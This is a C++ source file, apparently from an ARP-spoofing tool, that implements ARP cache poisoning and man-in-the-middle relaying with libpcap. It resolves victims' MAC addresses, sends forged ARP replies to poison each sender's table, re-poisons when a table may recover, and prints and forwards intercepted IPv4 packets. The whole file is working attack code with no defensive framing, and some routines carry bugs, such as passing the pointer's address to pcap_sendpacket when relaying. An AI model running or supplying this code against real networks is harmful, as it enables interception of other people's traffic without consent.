#include <unistd.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <linux/if.h> /* IFNAMSIZ */
#include <pthread.h>
#include <pcap.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include "attack.h"
#include "util.h"

static int send_arp_packet(struct attack_ctx *ctx, Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, uint16_t op)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac; 
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(op);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);

    int res = pcap_sendpacket(ctx->handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        pr_err("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(ctx->handle));
    }

    return res;
}

static Mac get_mac_by_ip(struct attack_ctx *ctx, Ip ip)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    ArpHdr *arp_hdr;
    int ret;
    
    /* TODO: Test if it's a Mac address I've already found */

    ret = send_arp_packet(ctx, Mac::broadcastMac(), ctx->my_mac, Mac::nullMac(), ctx->my_ip, ip, ArpHdr::Request);
    if (ret != 0) {
        return Mac::nullMac();
    }

    while (true) {
        ret = pcap_next_ex(ctx->handle, &header, &packet);
        if (ret == 0)
            continue;
        if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
            pr_err("pcap_next_ex return %d(%s)\n", ret, pcap_geterr(ctx->handle));
            return Mac::nullMac();
        }

        arp_hdr = (ArpHdr *)(packet + sizeof(EthHdr));
        if (arp_hdr->op() == ArpHdr::Reply && ctx->my_ip == arp_hdr->tip() && 
            ctx->my_mac == arp_hdr->tmac() && ip == arp_hdr->sip()) 
            break;
    }

    return arp_hdr->smac();
}

static Mac get_my_mac(char *interface)
{
    struct ifreq ifr;
    Mac my_mac;
    int ret;
    int sk;

    sk = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr)); 
    strcpy(ifr.ifr_name, interface); 

    ret = ioctl(sk, SIOCGIFHWADDR, &ifr);
    close(sk);

    if (ret < 0) { 
        pr_err("Cannot get a MAC address\n");
        my_mac = Mac::nullMac();
    } else {
        my_mac = Mac((uint8_t *)ifr.ifr_hwaddr.sa_data); 
    }
        
    return my_mac;
}

static Ip get_my_ip(char *interface)
{
    struct ifreq ifr;
    char ip_str[16];
    Ip my_ip;
    int ret;
    int sk;

    sk = socket(AF_INET, SOCK_DGRAM, 0);

    memset(&ifr, 0, sizeof(ifr)); 
    strcpy(ifr.ifr_name, interface); 

    ret = ioctl(sk, SIOCGIFADDR, &ifr);
    close(sk);
        
    if (ret < 0) {
        pr_err("Cannot get a IP address\n");
        my_ip = Ip::nullIp();
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ip_str, sizeof(struct sockaddr));
        my_ip = Ip(ip_str);
    } 

    return my_ip;
}

static int parse_packet(struct pcap_pkthdr *header, const u_char *packet, struct info *info)
{
    EthHdr *eth_hdr;
    ArpHdr *arp_hdr;
    IpHdr *ip_hdr;

    if (header->caplen < sizeof(EthHdr))
        return 0;

    eth_hdr = (EthHdr *)packet;
    if (!(eth_hdr->smac() == info->sender_mac || eth_hdr->smac() == info->target_mac || eth_hdr->dmac().isBroadcast()))
        return 0;
    
    if (eth_hdr->type() == EthHdr::Arp) {
        arp_hdr = (ArpHdr *)((char *)eth_hdr + sizeof(EthHdr));

        /* Sender -> All (ARP_REQ) => case 1 */
        if (arp_hdr->sip() == info->sender_ip && arp_hdr->tip() == info->target_ip && arp_hdr->op() == ArpHdr::Request)
            return 1;

        /* Target -> Sender (ARP_REP) => case 2 */
        if (arp_hdr->sip() == info->target_ip && arp_hdr->tip() == info->sender_ip && arp_hdr->op() == ArpHdr::Reply)
            return 2;

        /* Target -> Sender (ARP_REQ) => case 3 */
        if (arp_hdr->sip() == info->target_ip && arp_hdr->tip() == info->sender_ip && arp_hdr->op() == ArpHdr::Request)
            return 3;
    }
    else if (eth_hdr->type() == EthHdr::Ip4) {
        ip_hdr = (IpHdr *)((char *)eth_hdr + sizeof(EthHdr));
        
        if (eth_hdr->smac() != info->sender_mac || ip_hdr->sip() != info->sender_ip) 
            return 0;

        return 4;
    }
    /* TODO: parse ipv6 packet */

    return 0;
}

int relay_packet(struct attack_ctx *ctx, struct info *info, const u_char *packet, int packet_len)
{
    EthHdr *eth_hdr;
    IpHdr *ip_hdr;
    int ret;

    eth_hdr = (EthHdr *)packet;
    ip_hdr = (IpHdr *)((char *)eth_hdr + sizeof(EthHdr));

    eth_hdr->smac_ = ctx->my_mac;
    eth_hdr->dmac_ = info->target_mac;
    ip_hdr->ip_src = ctx->my_ip;
    ip_hdr->ip_dst = info->target_ip;

    ret = pcap_sendpacket(ctx->handle, reinterpret_cast<const u_char*>(&packet), packet_len);
    if (ret < 0) {
        pr_err("pcap_sendpacket return %d error=%s\n", ret, pcap_geterr(ctx->handle));
        return ret;
    }

    return 0;
}

static void print_packet(const u_char *packet)
{
    EthHdr *eth_hdr;
    IpHdr *ip_hdr;

    eth_hdr = (EthHdr *)packet;
    ip_hdr = (IpHdr *)((char *)eth_hdr + sizeof(EthHdr));

    pr_info("============= <ETHERNET HEADER> =============\n"
           "src mac: %s\n"
           "dst mac: %s\n\n", 
           std::string(eth_hdr->smac()).c_str(),
           std::string(eth_hdr->dmac()).c_str());
    
    pr_info("=============   <IPV4 HEADER>   =============\n"
           "src ip: %s\n"
           "dst ip: %s\n\n",
           std::string(ip_hdr->sip()).c_str(),
           std::string(ip_hdr->dip()).c_str());
}

static int handle_packet(struct attack_ctx *ctx)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    
    int type;
    int ret;

    struct info *infoes = ctx->infoes;

    while (true) {
        ret = pcap_next_ex(ctx->handle, &header, &packet);
        if (ret == 0)
            continue;
        if (ret == PCAP_ERROR || ret == PCAP_ERROR_BREAK) {
            pr_err("pcap_next_ex return %d(%s)\n", ret, pcap_geterr(ctx->handle));
            return -1;
        }

        for (int i = 0; i < ctx->info_count; i++) {
            type = parse_packet(header, packet, &infoes[i]);
            switch (type)
            {
            case 1:
            case 2:
            case 3:
                pr_debug("sender %d may be recovered\n");
                ret = send_arp_packet(ctx, infoes[i].sender_mac, ctx->my_mac, infoes[i].sender_mac, 
                                infoes[i].target_ip, infoes[i].sender_ip, ArpHdr::Reply);
                if (ret < 0){
                    pr_err("Cannot poison sender's arp table\n");
                    return -1;
                }
                break;
            case 4:
                print_packet(packet);
                ret = relay_packet(ctx, &ctx->infoes[i], packet, header->caplen);
                if (ret < 0){
                    pr_err("Cannot relay packet\n");
                    return -1;
                }
                break;
            
            default:
                break;
            }
        }
    }

    return 0;
}

int get_st_info(struct attack_ctx *ctx)
{
    for (int i = 0; i < ctx->info_count; i++) {
        ctx->infoes[i].sender_mac = get_mac_by_ip(ctx, ctx->infoes[i].sender_ip);
        ctx->infoes[i].target_mac = get_mac_by_ip(ctx, ctx->infoes[i].target_ip);
        if (ctx->infoes[i].sender_mac.isNull() || ctx->infoes[i].target_mac.isNull())
            return -1;

        pr_debug("Sender %d Info\n", i + 1);
        pr_debug("Ip: %s\n", std::string(ctx->infoes[i].sender_ip).c_str());
        pr_debug("Mac: %s\n", std::string(ctx->infoes[i].sender_mac).c_str());
        pr_debug("Target %d Info\n", i + 1);
        pr_debug("Ip: %s\n", std::string(ctx->infoes[i].target_ip).c_str());
        pr_debug("Mac: %s\n", std::string(ctx->infoes[i].target_mac).c_str());
    }

    return 0;
}

int get_my_info(struct attack_ctx *ctx)
{
    char *interface = ctx->interface;

    ctx->my_ip = get_my_ip(interface);
    ctx->my_mac = get_my_mac(interface);

    if (ctx->my_ip.isNull() || ctx->my_mac.isNull())
        return -1; 

    pr_debug("My Info\n");
    pr_debug("Ip: %s\n", std::string(ctx->my_ip).c_str());
    pr_debug("Mac: %s\n", std::string(ctx->my_mac).c_str());

    return 0;
}

int spoof_packet(struct attack_ctx *ctx)
{
    int ret;

    struct info *infoes = ctx->infoes; 

    for (int i = 0; i < ctx->info_count; i++) {
        ret = send_arp_packet(ctx, infoes[i].sender_mac, ctx->my_mac, infoes[i].sender_mac, 
                                infoes[i].target_ip, infoes[i].sender_ip, ArpHdr::Reply);
        if (ret < 0){
            pr_err("Cannot poison sender's arp table\n");
            return -1;
        }
    }

    ret = handle_packet(ctx);
    if (ret < 0) {
        pr_err("Error while handling packet\n");
        return -1;
    }


    return 0;
}